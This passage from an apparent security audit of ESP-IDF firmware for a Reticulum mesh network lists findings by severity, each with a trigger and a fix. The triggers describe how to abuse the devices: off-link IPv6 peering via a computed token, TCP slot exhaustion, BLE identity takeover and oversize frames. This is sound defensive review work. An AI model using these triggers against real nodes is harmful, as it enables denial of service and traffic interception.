**Impact:** (1) Real peers can never join. (2) Every outbound RNS packet is unicast to 16 bogus addresses — 16× transmit amplification plus neighbour-discovery churn for unresolvable addresses. (3) Each bogus peer is declared to rnsd and triggers a full hosted-destination announce replay (`rnsdIfaceAnnounceNow("auto")`): a cheap announce-flood amplifier.
**Fix:** Require `IN6_IS_ADDR_LINKLOCAL(&src)` for token and data paths; evict the oldest `last_heard` entry instead of refusing when full; rate-limit `rnsdIfaceAnnounceNow` to once per few seconds.

### [Medium] iface-auto: sockets bound to `[::]`, so an off-link IPv6 host can peer and inject
**Where:** iface-auto/esp-idf/src/auto.cpp:304-336 (`makeSock` binds `in6addr_any`), :498-513 (no scope check on `src`), :566-583 (data accepted from any "known peer").
**Attacker:** any IPv6 host that can route a UDP datagram to the device (global/ULA address on the STA netif, routed IPv6 LAN).
**Issue:** Upstream AutoInterface binds the unicast/data sockets to the link-local address; here all three bind `[::]` with `IPV6_V6ONLY`, and the expected token is computed from whatever source address arrived, so a global-address sender who unicasts the right token to :29717 becomes a peer and its datagrams on :42671 are forwarded verbatim to rnsd.
**Trigger:** From `2001:db8::bad`, send `SHA-256("reticulum" || "2001:db8::bad")` to `[victim-global]:29717`, then packets to `:42671`.
**Impact:** A "zero-config LAN" interface reachable from outside the LAN; the attacker receives every outbound RNS packet and can inject (IFAC still drops injected packets in rnsd, but the peer slot, fan-out and announce amplification above apply).
**Fix:** Bind the unicast and data sockets to `s_ourAddr` with `sin6_scope_id = s_ifIndex`, and drop any token/data whose source is not `fe80::/10`.

### [Medium] iface-tcp: listener is open, internet-exposed by default, and the 8 inbound slots have no application-level idle timeout
**Where:** iface-tcp/esp-idf/src/tcp.cpp:39 (`TCP_MAX_INBOUND 8`), :1311-1316 (`upnp` default 1), :1386-1442 (`onInboundConnect` registers an rnsd interface immediately), :1460-1473 (`backlog 4`, keepalive); spangap-net/esp-idf/src/net.cpp:472-490 (keepalive idle 10 s detects *dead* peers only).
**Attacker:** anyone who can reach the listen port — with the default `upnp = 1` and the upnp straddle in the build, the internet.
**Issue:** Every accepted socket becomes an rnsd interface carrying the server's mode/IFAC and stays one until the peer closes. A caller that connects and sends nothing (or only FLAG bytes) holds the slot indefinitely. The shared 8-slot relay pool in net is already reported in the net review; this is the interface-level half.
**Trigger:** Open 8 TCP connections to :4965 and keep them alive.
**Impact:** Inbound Reticulum peering denied; each held connection also receives the announce replay of every hosted destination (Reticulum design on an open interface, but the `upnp` default makes it internet-facing).
**Fix:** Default `upnp` to 0 for this listener; drop an inbound connection that has delivered no complete HDLC frame within N seconds; per-source connection limit.

### [Low] iface-ble: unauthenticated centrals can occupy every peer slot and, with a copied identity, take over a silent peer's interface row
**Where:** iface-ble/esp-idf/src/ble_iface.cpp:364-415 (`bleifClaimInbound` on any subscribe or 16-byte write), :253-268 (a 16-byte write is the handshake), ble_peers.cpp:551-620 (`peerAdoptIdent`: an existing row cedes to a newcomer with the same identity if it has been silent for >25 s), ble_iface.cpp:146-155 (Identity characteristic readable by anyone). Off by default (`s.ble.rns.enable` = 0).
**Attacker:** anyone in BLE range of a node with the mesh interface on.
**Issue:** The v2.2 protocol has no authentication by design (IFAC is the control), and the code implements it faithfully: a central that subscribes and writes 16 bytes becomes READY and gets its own rnsd interface (`ble/<hex>`), consuming one of `max_peers` (default 3) and one global `RNSD_MAX_IFACES` slot. Identities are readable from the Identity characteristic of any peer, so an attacker can present a real peer's identity; if that peer's link has carried nothing for 25 s the attacker's connection is moved onto the real peer's row and inherits its rnsd interface (traffic to that peer now goes to the attacker's link).
**Trigger:** Connect, write `0x0001` to the TX CCCD, write 16 bytes to RX.
**Impact:** Peer-slot exhaustion (legitimate peers refused; eviction only takes non-READY rows) and misrouting of a peer's traffic to the attacker's link; payloads remain end-to-end encrypted and IFAC, when set, rejects injected packets. Fragment reassembly is bounded (`reasmLen + n > 500` resets; 512-byte inbound cap; queue depth 16).
**Fix:** Recommend IFAC on this interface in the README as the default posture; consider requiring the newcomer to prove the identity (e.g. an RNS-signed challenge) before `peerAdoptIdent` cedes a row; rate-limit inbound claims per address as the dial gate already does for outbound.

### [Low] iface-auto: no MTU enforcement before handing to rnsd (datagrams up to 1200 B forwarded)
**Where:** iface-auto/esp-idf/src/auto.cpp:82 (`RX_DGRAM_MAX 1200`), :700-718, :572-581.
**Attacker:** any admitted peer.
**Issue:** The interface registers `mtu = 500` but forwards any datagram up to 1200 B (plus the 16-byte origin prefix). rnsd drains into a 600-byte `pktbuf` (rnsd.cpp:874), so nothing overflows, but oversize packets reach `handle_incoming` instead of being dropped, each costing a 1.2 KB PSRAM alloc and a queue slot (`RX_QDEPTH` 16).
**Trigger:** 1200-byte UDP datagram to :42671 from a peer.
**Impact:** Wasted rnsd work and rx-queue pressure; no memory-safety issue.
**Fix:** Drop `RX_DATA` with `len > RNS_MTU` in `rxRecvOne`/`drainRx`, bump `rx_drop`.

### [Low] iface-tcp and iface-lora accept frames 8 bytes over the registered MTU
**Where:** iface-tcp/esp-idf/src/tcp.cpp:77, :1245 (`rx_pkt[RNS_MTU + 8]`), :253-261; iface-lora/esp-idf/src/lora_bridge.cpp:465-474 (two 254-byte halves → 508 B, `splitBuf[516]`), :108 (`rnsdInject` clamps at 516).
**Attacker:** any TCP peer / anyone on the LoRa channel.
**Issue:** Both decoders are bounded (no overflow) but emit 501-508-byte packets to rnsd rather than dropping them; rnsd's 600-byte buffer contains them.
**Trigger:** `7E <508 bytes> 7E` on TCP; two SPLIT frames of 255 bytes on air.
**Impact:** Cosmetic relative to the MTU contract.
**Fix:** Emit only when the assembled length is `<= RNS_MTU`.

### [Low] iface-lora: the SUPE/IFAC gate tests `ifac_size`, not whether IFAC is configured
**Where:** iface-lora/esp-idf/src/lora.cpp:501-511 (`haveIfac = ifac_size != 0`), :529-536 (netname/netkey read afterwards; `ifac_size` 0 means "default 1" per ports.h:268).
**Attacker:** n/a (configuration logic).
**Issue:** An operator who sets an IFAC network name and passphrase but leaves `ifac_size` at its default 0 has IFAC active in rnsd (size 1) while the interface believes it has no access code: SUPE is mounted and, if enabled, speaks — so the unauthenticated SUPE surface (two findings above) stays open on a network the operator believes is access-coded, and the "SUPE off: an access code is configured" line never prints.
**Trigger:** `set s.lora.0.ifac_netname=x`, `set s.lora.0.ifac_netkey=y`, `set s.lora.0.SUPE.enable=1`.
**Impact:** Defeats the documented "IFAC disables SUPE" rule on the common configuration.
**Fix:** `haveIfac = ifac_netname[0] || ifac_netkey[0] || ifac_size`.

### [Info] IFAC passphrases live under `s.*`, so they sync to every browser session (docs and a comment say otherwise)
**Where:** iface-tcp/esp-idf/src/tcp.cpp:292, :1334; iface-auto/esp-idf/src/auto.cpp:633; iface-espnow/esp-idf/src/espnow.cpp:435; iface-lora/esp-idf/src/lora.cpp:529-535 (comment says "passphrase is a secret (secrets.)" but reads `s.lora.<n>.ifac_netkey`); iface-ble/esp-idf/src/ble_iface.cpp:438; each straddle.yaml `secret: true` (UI masking only).
**Attacker:** anyone with a browser session or a storage dump — not a network attacker.
**Issue:** spangap-core/docs/storage.md withholds only `secrets.*` from the browser; every interface stores the passphrase under `s.*`, so the full tree sent on connect contains it. iface-auto/README.md ("Secrets (`secrets.*` … never synced to the browser)"), iface-espnow/README.md ("Write-only from the browser") and iface-ble/README.md ("Secrets (persisted, never sent to the browser)") are stale relative to the code; iface-tcp's README states the choice explicitly. rnsd logs only `ifac=on/off` (rnsd.cpp:810-813), never the key.
**Trigger:** n/a.
**Impact:** Design decision, but the docs and the flag suggest stronger handling than exists.
**Fix:** Either move the keys under `secrets.*` with a write-only UI field, or correct the three READMEs and the lora.cpp comment.

### [Info] Radio parameters have sanity bounds, not regulatory ones (frequency, bandwidth, TX power)
**Where:** iface-lora/esp-idf/src/lora.cpp:278-283 (`radioStart` accepts any `freq_hz > 0`), lora_cli.cpp:1037-1053 (`lora <n> freq|bw|txp` write storage unchecked), lora.cpp:776 / lora_rnode.cpp:208 (100 MHz–2 GHz / 5 kHz–1.7 MHz); iface-espnow/esp-idf/src/espnow.cpp:51-52, :424 (channels 1–13 accepted everywhere; 12/13 are region-restricted).
**Attacker:** operator / RNode client only.
**Issue:** No band plan is enforced anywhere except inside SUPE's regime tables; TX power is clamped to the board's calibrated range, which is the right ceiling for the hardware but not for a region. RadioLib will refuse frequencies outside the chip's tuning range, nothing refuses a legal-but-wrong one.
**Trigger:** `lora 0 freq 433` on an 868 MHz deployment.
**Impact:** Regulatory rather than security; noted briefly as requested.
**Fix:** A per-region allow-list keyed off the SUPE regime (or a new `s.lora.region`) applied in `radioStart` and the RNode path.

### [Info] iface-espnow: framing is sound; the magic prefix is the only filter
**Where:** iface-espnow/esp-idf/src/espnow.cpp:245-266, :384-398.
**Attacker:** anyone within 2.4 GHz range.
**Issue:** `len <= 4` rejected, magic compared, `plen > RNS_MTU` rejected, fixed 500-byte queue slot copied by value; ESP-NOW v2 delivers the true length so there is no length-byte mismatch to exploit. Any station can inject ≤500-byte packets tagged `"RNS\x01"`; only IFAC in rnsd authenticates them.
**Trigger:** n/a.
**Impact:** None beyond the open-medium model.
**Fix:** none needed.

### [Info] loramon: record parsing is bounded; peer names reach an LVGL label with recolor enabled
**Where:** loramon/esp-idf/conditional/spangap-lcd/src/loramon_lcd.cpp:383-394 (`sscanf … %7s` into `tg[8]`), :935-937 (`lv_label_set_recolor(l, true)` on the pill labels), :684-712 (pill text = `loraNameForTag` → announced display name); browser LoraMonWindow.vue uses `fillText` only.
**Attacker:** a node announcing a crafted `lxmf.delivery`/`nomadnetwork.node` display name.
**Issue:** The record fields are device-authored numbers and a 6-hex tag, all bounded. The only untrusted text is the peer's announced name (decoded by rnsd's `rnsdAnnounceName`, truncated to 20 bytes), which the LCD pill renders with LVGL recolor syntax on, so a name like `#ff0000 x#` changes the pill's colour. Cosmetic.
**Trigger:** Announce with app_data name `#00ff00 hi#`.
**Impact:** Cosmetic only; no format string, no unbounded copy.
**Fix:** `lv_label_set_recolor(false)` for the pill labels, or escape `#`.

## Positive notes

- iface-tcp `hdlcConsume` is a correct streaming decoder: bounded buffer, resync on FLAG after overflow, escape flag reset on FLAG, empty frames ignored, drop reporting coalesced so a flood cannot log-storm the shared core. `max_conns` is clamped to `TCP_MAX_INBOUND`; a disabled listener really closes the socket.
- iface-lora's RX path range-checks `getPacketLength()` before `readData` (lora_bridge.cpp:218), discards unread packets from FIFO parts so a stale frame cannot masquerade as a new one, and bounds split reassembly (`splitLen + payloadLen <= sizeof splitBuf`). The 0x04 power request only ever influences replies on the link it prefixes, and `apClamp` never exceeds the configured `tx_power`.
- The RNode KISS decoder (lora_rnode.cpp:342-367) handles FESC/TFEND/TFESC correctly, swallows over-long frames to the next FEND, and every command length-checks its payload; `CMD_DATA` is capped at `RNS_MTU`. The three doors are distinguished by payload size with static_asserts keeping them distinct, and the BLE payload additionally carries a magic.
- rnode-ble's RX characteristic is `WRITE_ENC` and writes are accepted only from the subscribed connection; spangap-ble refuses bonds outside the operator's pairing window and undoes one written anyway (ble_sec.cpp:151-163).
- SUPE's codec is length-driven throughout: announce count from frame length capped at `SUPE_ANN_MAX`, GOT/RESEND masks sized from *our* train count, END count capped at `SUPE_TRAIN_MAX`; the meeting has an 8 s watchdog and every retune has an unconditional way home (`hTuneHome`).
- The passive neighbour table only merges rows on a *signed* Reticulum announce (`observeAnnounce` verifies dest = H(name‖H(pub)) and the Ed25519 signature before touching the table), relayer claims (HEADER_2 transport_id) attribute only to rows that already exist, and every fixed-size store (24 rows, 12 links, 8 pends, 48 hashes) evicts LRU rather than failing.
- iface-ble's fragment layer is driven by seq/total with a hard 500-byte assembled cap and a 512-byte per-write cap; inbound writes are copied in host context and processed on the owning task; peers are torn down rnsd-first so no frame can reach a half-gone interface.
- iface-auto's token check is byte-exact with upstream, the multicast echo of our own token is ignored, and data from unknown sources is dropped before rnsd.
- rnsd's registration path clamps every string field of `rnsd_iface_t`, refuses duplicate interface names, and drains inbound frames into a fixed 600-byte buffer, so an oversize frame from any straddle is a wasted packet rather than an overflow.
